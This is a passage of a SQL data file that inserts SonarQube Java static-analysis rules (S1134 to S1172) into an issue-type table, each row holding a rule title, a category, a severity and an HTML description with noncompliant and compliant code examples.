  public void foo() {    // Noncompliant
  }

  @Deprecated            // Noncompliant
  public void bar() {
  }

  public void baz() {    // Compliant
  }
}
</pre>', 'java', 'READY', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1134', 'Track uses of "FIXME" tags', 'sonarqube', 'Code Smell', '<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int divide(int numerator, int denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1135', 'Track uses of "TODO" tags', 'sonarqube', 'Code Smell', '<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>', 'java', 'READY', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S114', 'Interface names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
interface names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
public interface myInterface {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface MyInterface {...}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1141', 'Try-catch blocks should not be nested', 'sonarqube', 'Code Smell', '<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand
which block will catch which exception.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1142', 'Methods should not have too many return statements', 'sonarqube', 'Code Smell', '<p>Having too many return statements in a method increases the method''s essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
public boolean myMethod() { // Noncompliant; there are 4 return statements
  if (condition1) {
    return true;
  } else {
    if (condition2) {
      return false;
    } else {
      return true;
    }
  }
  return false;
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1143', 'Jump statements should not occur in "finally" blocks', 'sonarqube', 'Bug', '<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any
unhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and
<code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println("OK");   // incorrect "OK" message is printed
  } catch (RuntimeException e) {
    System.out.println("ERROR");  // this message is not shown
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
    return;      // Noncompliant - prevents the RuntimeException from being propagated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println("OK");
  } catch (RuntimeException e) {
    System.out.println("ERROR");  // "ERROR" is printed as expected
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/584.html">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/BTdGBQ">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1144', 'Unused "private" methods should be removed', 'sonarqube', 'Code Smell', '<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> methods that are only
accessed using the reflection API.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Serializable
{
  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static void doSomething(){
    Foo foo = new Foo();
    ...
  }
  private void unusedPrivateMethod(){...}
  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism
  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements Serializable
{
  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.
  public static void doSomething(){
    Foo foo = new Foo();
    ...
  }

  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism

  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise any issue on annotated methods.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1145', 'Useless "if(true) {...}" and "if(false){...}" blocks should be removed', 'sonarqube', 'Bug', '<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {
  doSomething();
}
...
if (false) {
  doSomethingElse();
}

if (2 &lt; 3 ) { ... }  // Noncompliant; always false

int i = 0;
int j = 0;
// ...
j = foo();

if (j &gt; 0 &amp;&amp; i &gt; 0) { ... }  // Noncompliant; always false - i never set after initialization

boolean b = true;
//...
if (b || !b) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS2583''>S2583</a> instead.</p>', 'java', 'DEPRECATED', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1147', 'Exit methods should not be called', 'sonarqube', 'Code Smell', '<p>Calling <code>System.exit(int status)</code> or <code>Rutime.getRuntime().exit(int status)</code> calls the shutdown hooks and shuts downs the
entire Java virtual machine. Calling <code>Runtime.getRuntime().halt(int)</code> does an immediate shutdown, without calling the shutdown hooks, and
skipping finalization.</p>
<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole Java process. For instance, none of them
should be called from applications running in a J2EE container.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.exit(0);
Runtime.getRuntime().exit(0);
Runtime.getRuntime().halt(0);
</pre>
<h2>Exceptions</h2>
<p>These methods are ignored inside <code>main</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/382.html">MITRE, CWE-382</a> - Use of System.exit() </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/7zZGBQ">CERT, ERR09-J.</a> - Do not allow untrusted code to terminate the JVM </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1148', 'Throwable.printStackTrace(...) should not be called', 'sonarqube', 'Vulnerability', '<p><code>Throwable.printStackTrace(...)</code> prints a <code>Throwable</code> and its stack trace to some stream. By default that stream
<code>System.Err</code>, which could inadvertently expose sensitive information.</p>
<p>Loggers should be used instead to print <code>Throwable</code>s, as they have many advantages:</p>
<ul>
  <li> Users are able to easily retrieve the logs. </li>
  <li> The format of log messages is uniform and allow users to browse the logs easily. </li>
</ul>
<p>This rule raises an issue when <code>printStackTrace</code> is used without arguments, i.e. when the stack trace is printed to the default
stream.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch(Exception e) {
  e.printStackTrace();        // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch(Exception e) {
  LOGGER.log("context", e);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS4507''>S4507</a> instead.</p>', 'java', 'DEPRECATED', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1149', 'Synchronized classes Vector, Hashtable, Stack and StringBuffer should not be used', 'sonarqube', 'Code Smell', '<p>Early classes of the Java API, such as <code>Vector</code>, <code>Hashtable</code> and <code>StringBuffer</code>, were synchronized to make them
thread-safe. Unfortunately, synchronization has a big negative impact on performance, even when using these collections from a single thread.</p>
<p>It is better to use their new unsynchronized replacements:</p>
<ul>
  <li> <code>ArrayList</code> or <code>LinkedList</code> instead of <code>Vector</code> </li>
  <li> <code>Deque</code> instead of <code>Stack</code> </li>
  <li> <code>HashMap</code> instead of <code>Hashtable</code> </li>
  <li> <code>StringBuilder</code> instead of <code>StringBuffer</code> </li>
</ul>
<p>Even when used in synchronized context, you should think twice before using it, since it''s usage can be tricky. If you are confident the usage is
legitimate, you can safely ignore this warning.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Vector cats = new Vector();
</pre>
<h2>Compliant Solution</h2>
<pre>
ArrayList cats = new ArrayList();
</pre>
<h2>Exceptions</h2>
<p>Use of those synchronized classes is ignored in the signatures of overriding methods.</p>
<pre>
@Override
public Vector getCats() {...}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S115', 'Constant names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
public class MyClass {
  public static final int first = 1;
}

public enum MyEnum {
  first;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public static final int FIRST = 1;
}

public enum MyEnum {
  FIRST;
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1150', 'Enumeration should not be implemented', 'sonarqube', 'Code Smell', '<p>From the official Oracle Javadoc:</p>
<blockquote>
  <p>NOTE: The functionality of this Enumeration interface is duplicated by the Iterator interface. In addition, Iterator adds an optional remove
  operation, and has shorter method names. New implementations should consider using Iterator in preference to Enumeration.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass implements Enumeration {  // Non-Compliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass implements Iterator {     // Compliant
  /* ... */
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1151', '"switch case" clauses should not have too many lines of code', 'sonarqube', 'Code Smell', '<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 5:</p>
<pre>
switch (myVariable) {
  case 0: // Noncompliant: 6 lines till next case
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
    break;
  case 1:
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 0:
    doSomething()
    break;
  case 1:
  ...
}
...
private void doSomething(){
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1153', 'String.valueOf() should not be appended to a String', 'sonarqube', 'Code Smell', '<p>Appending <code>String.valueOf()</code> to a <code>String</code> decreases the code readability.</p>
<p>The argument passed to <code>String.valueOf()</code> should be directly appended instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void display(int i){
  System.out.println("Output is " + String.valueOf(i));    // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void display(int i){
  System.out.println("Output is " + i);                    // Compliant
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1155', 'Collection.isEmpty() should be used to test for emptiness', 'sonarqube', 'Code Smell', '<p>Using <code>Collection.size()</code> to test for emptiness works, but using <code>Collection.isEmpty()</code> makes the code more readable and can
be more performant. The time complexity of any <code>isEmpty()</code> method implementation should be <code>O(1)</code> whereas some implementations
of <code>size()</code> can be <code>O(n)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myCollection.size() == 0) {  // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myCollection.isEmpty()) {
  /* ... */
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1157', 'Case insensitive string comparisons should be made without intermediate upper or lower casing', 'sonarqube', 'Code Smell', '<p>Using <code>toLowerCase()</code> or <code>toUpperCase()</code> to make case insensitive comparisons is inefficient because it requires the creation
of temporary, intermediate <code>String</code> objects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
boolean result1 = foo.toUpperCase().equals(bar);             // Noncompliant
boolean result2 = foo.equals(bar.toUpperCase());             // Noncompliant
boolean result3 = foo.toLowerCase().equals(bar.LowerCase()); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean result = foo.equalsIgnoreCase(bar);                  // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised when a locale is specified because the result could be different from "equalsIgnoreCase". (e.g.: using the Turkish
locale)</p>
<pre>
boolean result1 = foo.toUpperCase(locale).equals(bar);             // Compliant
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1158', 'Primitive wrappers should not be instantiated only for "toString" or "compareTo" calls', 'sonarqube', 'Code Smell', '<p>Creating temporary primitive wrapper objects only for <code>String</code> conversion or the use of the <code>compareTo</code> method is
inefficient.</p>
<p>Instead, the static <code>toString()</code> or <code>compare</code> method of the primitive wrapper class should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
new Integer(myInteger).toString();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Integer.toString(myInteger);        // Compliant
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S116', 'Field names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
   private int my_field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
   private int myField;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1160', 'Public methods should throw at most one checked exception', 'sonarqube', 'Code Smell', '<p>Using checked exceptions forces method callers to deal with errors, either by propagating them or by handling them. Throwing exceptions makes them
fully part of the API of the method.</p>
<p>But to keep the complexity for callers reasonable, methods should not throw more than one kind of checked exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void delete() throws IOException, SQLException {      // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void delete() throws SomeApplicationLevelException {
  /* ... */
}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are not checked by this rule and are allowed to throw several checked exceptions.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1161', '"@Override" should be used on overriding and implementing methods', 'sonarqube', 'Code Smell', '<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>
<ul>
  <li> It elicits a warning from the compiler if the annotated method doesn''t actually override anything, as in the case of a misspelling. </li>
  <li> It improves the readability of the source code by making it obvious that methods are overridden. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  public boolean doSomething(){...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  @Override
  public boolean doSomething(){...}  // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed when overriding a method from the <code>Object</code> class like <code>toString()</code>, <code>hashCode()</code>, ...</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1162', 'Checked exceptions should not be thrown', 'sonarqube', 'Code Smell', '<p>The purpose of checked exceptions is to ensure that errors will be dealt with, either by propagating them or by handling them, but some believe
that checked exceptions negatively impact the readability of source code, by spreading this error handling/propagation logic everywhere.</p>
<p>This rule verifies that no method throws a new checked exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod1() throws CheckedException {
  ...
  throw new CheckedException(message);   // Noncompliant
  ...
  throw new IllegalArgumentException(message); // Compliant; IllegalArgumentException is unchecked
}

public void myMethod2() throws CheckedException {  // Compliant; propagation allowed
  myMethod1();
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1163', 'Exceptions should not be thrown in finally blocks', 'sonarqube', 'Code Smell', '<p>Throwing an exception from within a finally block will mask any exception which was previously thrown in the <code>try</code> or <code>catch</code>
block, and the masked''s exception message and stack trace will be lost.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* some work which end up throwing an exception */
  throw new IllegalArgumentException();
} finally {
  /* clean up */
  throw new RuntimeException();       // Noncompliant; masks the IllegalArgumentException
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* some work which end up throwing an exception */
  throw new IllegalArgumentException();
} finally {
  /* clean up */
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/FTZGBQ">CERT, ERR05-J.</a> - Do not let checked exceptions escape from a finally block </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1165', 'Exception classes should be immutable', 'sonarqube', 'Code Smell', '<p>Exceptions are meant to represent the application''s state at the point at which an error occurred.</p>
<p>Making all fields in an <code>Exception</code> class <code>final</code> ensures that this state:</p>
<ul>
  <li> Will be fully defined at the same time the <code>Exception</code> is instantiated. </li>
  <li> Won''t be updated or corrupted by a questionable error handler. </li>
</ul>
<p>This will enable developers to quickly understand what went wrong.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyException extends Exception {

  private int status;                               // Noncompliant

  public MyException(String message) {
    super(message);
  }

  public int getStatus() {
    return status;
  }

  public void setStatus(int status) {
    this.status = status;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyException extends Exception {

  private final int status;

  public MyException(String message, int status) {
    super(message);
    this.status = status;
  }

  public int getStatus() {
    return status;
  }

}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1166', 'Exception handlers should preserve the original exceptions', 'sonarqube', 'Code Smell', '<p>When handling a caught exception, the original exception''s message and stack trace should be logged or passed forward.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {   // Noncompliant - exception is lost
  LOGGER.info("context");
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)
  LOGGER.info(e.getMessage());
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - original exception is lost
  throw new RuntimeException("context");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  LOGGER.info(e);  // exception is logged
}

try {
  /* ... */
} catch (Exception e) {
  throw new RuntimeException(e);   // exception stack trace is propagated
}

try {
  /* ... */
} catch (RuntimeException e) {
  doSomething();
  throw e;  // original exception passed forward
} catch (Exception e) {
  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed
}
</pre>
<h2>Exceptions</h2>
<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and
<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling
<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>
<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are
correctly handled.</p>
<pre>
int myInteger;
try {
  myInteger = Integer.parseInt(myString);
} catch (NumberFormatException e) {
  // It is perfectly acceptable to not handle "e" here
  myInteger = 0;
}
</pre>
<p>Furthermore, no issue will be raised if the exception message is logged with additional information, as it shows that the developer added some
context to the error message.</p>
<pre>
try {
  /* ... */
} catch (Exception e) {
  String message = "Exception raised while authenticating user: " + e.getMessage();
  LOGGER.warn(message); // Compliant - exception message logged with some contextual information
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/xDdGBQ">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/778.html">MITRE, CWE-778</a> - Insufficient Logging </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1168', 'Empty arrays and collections should be returned instead of null', 'sonarqube', 'Code Smell', '<p>Returning <code>null</code> instead of an actual array or collection forces callers of the method to explicitly test for nullity, making them more
complex and less readable.</p>
<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static List&lt;Result&gt; getResults() {
  return null;                             // Noncompliant
}

public static Result[] getResults() {
  return null;                             // Noncompliant
}

public static void main(String[] args) {
  Result[] results = getResults();

  if (results != null) {                   // Nullity test required to prevent NPE
    for (Result result: results) {
      /* ... */
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static List&lt;Result&gt; getResults() {
  return Collections.emptyList();          // Compliant
}

public static Result[] getResults() {
  return new Result[0];
}

public static void main(String[] args) {
  for (Result result: getResults()) {
    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/aNYxBQ">CERT, MSC19-C.</a> - For functions that return an array, prefer returning an empty array
  over a null value </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/JzZGBQ">CERT, MET55-J.</a> - Return an empty array or collection instead of a null value for
  methods that return an array or collection </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S117', 'Local variable and method parameter names should comply with a naming convention', 'sonarqube', 'Code Smell', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public void doSomething(int my_param) {
  int LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int myParam) {
  int local;
  ...
}
</pre>
<h2>Exceptions</h2>
<p>Loop counters are ignored by this rule.</p>
<pre>
for (int i_1 = 0; i_1 &lt; limit; i_1++) {  // Compliant
  // ...
}
</pre>
<p>as well as one-character <code>catch</code> variables: </p>
<pre>
try {
//...
} catch (Exception e) { // Compliant
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1170', 'Public constants and fields initialized at declaration should be "static final" rather than merely "final"', 'sonarqube', 'Code Smell', '<p>Making a <code>public</code> constant just <code>final</code> as opposed to <code>static final</code> leads to duplicating its value for every
instance of the class, uselessly increasing the amount of memory required to execute the application.</p>
<p>Further, when a non-<code>public</code>, <code>final</code> field isn''t also <code>static</code>, it implies that different instances can have
different values. However, initializing a non-<code>static final</code> field in its declaration forces every instance to have the same value. So such
fields should either be made <code>static</code> or initialized in the constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Myclass {
  public final int THRESHOLD = 3;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Myclass {
  public static final int THRESHOLD = 3;    // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>No issues are reported on final fields of inner classes whose type is not a primitive or a String. Indeed according to the Java specification:</p>
<blockquote>
  <p>An inner class is a nested class that is not explicitly or implicitly declared static. Inner classes may not declare static initializers (§8.7)
  or member interfaces. Inner classes may not declare static members, unless they are compile-time constant fields (§15.28).</p>
</blockquote>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1171', 'Only static class initializers should be used', 'sonarqube', 'Code Smell', '<p>Non-static initializers are rarely used, and can be confusing for most developers because they only run when new class instances are created. When
possible, non-static initializers should be refactored into standard constructors or field initializers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;() {

    // Noncompliant - HashMap should be extended only to add behavior, not for initialization
    {
      put("a", "b");
    }

  };
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;();

  static {
    MY_MAP.put("a", "b");
  }
}
</pre>
<p>or using Java 9 <code>Map.of</code>:</p>
<pre>
class MyClass {
  // Compliant
  private static final Map&lt;String, String&gt; MY_MAP = java.util.Map.of("a", "b");
}
</pre>
<p>or using Guava:</p>
<pre>
class MyClass {
  // Compliant
  private static final Map&lt;String, String&gt; MY_MAP = ImmutableMap.of("a", "b");
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1172', 'Unused method parameters should be removed', 'sonarqube', 'Code Smell', '<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int a, int b) {     // "b" is unused
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int a) {
  compute(a);
}
</pre>
